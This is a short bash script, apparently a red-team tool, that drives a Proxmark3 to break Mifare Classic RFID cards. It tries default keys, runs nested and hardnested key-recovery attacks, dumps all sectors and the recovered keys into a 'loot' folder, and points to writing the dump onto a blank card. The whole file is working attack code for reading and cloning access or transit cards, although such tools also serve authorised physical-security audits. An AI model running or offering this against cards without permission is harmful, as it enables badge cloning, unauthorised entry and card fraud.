#!/usr/bin/env bash
# ==================================================================
#  rfid-mifare-classic-audit.sh
#  Description : Full Mifare Classic compromise via hf mf autopwn.
#                Attempts all default keys, then uses nested/hardnested
#                attacks to recover remaining sector keys. Dumps all
#                sectors on success.
#  Requires    : pm3 (Proxmark3 Iceman client)
#  Usage       : ./rfid-mifare-classic-audit.sh [pm3_port]
# ==================================================================

set -euo pipefail

PORT="${1:-}"
PM3_CMD="pm3"; [ -n "$PORT" ] && PM3_CMD="pm3 -p $PORT"
LOOT_DIR="./loot/mifare-audit-$(date +%Y%m%d_%H%M%S)"
mkdir -p "$LOOT_DIR"

echo " =================================================="
echo "  Proxmark3 — Mifare Classic Full Audit (autopwn)"
echo " =================================================="
echo "  This may take 1-5 minutes for nested key recovery."
echo ""

# Read card info first
echo "[*] Reading HF 14a card info..."
$PM3_CMD -c "hf 14a reader" 2>&1 | tee "${LOOT_DIR}/card_info.txt"

# Run autopwn — tries default keys, nested/hardnested attack, dumps all sectors
echo ""
echo "[*] Running hf mf autopwn..."
$PM3_CMD -c "hf mf autopwn" 2>&1 | tee "${LOOT_DIR}/autopwn_output.txt"

# Check for dump file (autopwn saves as hf-mf-<uid>-dump.bin)
DUMP_FILE=$(find . -name "hf-mf-*-dump*.bin" -newer "$LOOT_DIR" 2>/dev/null | head -1 || true)
if [ -n "$DUMP_FILE" ]; then
    mv "$DUMP_FILE" "${LOOT_DIR}/" 2>/dev/null || true
    echo "[+] Sector dump: ${LOOT_DIR}/$(basename "$DUMP_FILE")"

    # Also save human-readable dump
    BIN_BASE="${LOOT_DIR}/$(basename "${DUMP_FILE%.bin}")"
    $PM3_CMD -c "hf mf dump --file ${BIN_BASE}.bin" 2>&1 | tee "${LOOT_DIR}/dump_text.txt" || true
fi

# Extract recovered keys from autopwn output
echo ""
grep -iE "sector|key|found" "${LOOT_DIR}/autopwn_output.txt" | head -40 || true
echo ""
echo "[+] Mifare Classic audit complete. Loot: $LOOT_DIR"
echo "    Use 'hf mf restore' to write dump to blank Mifare card."
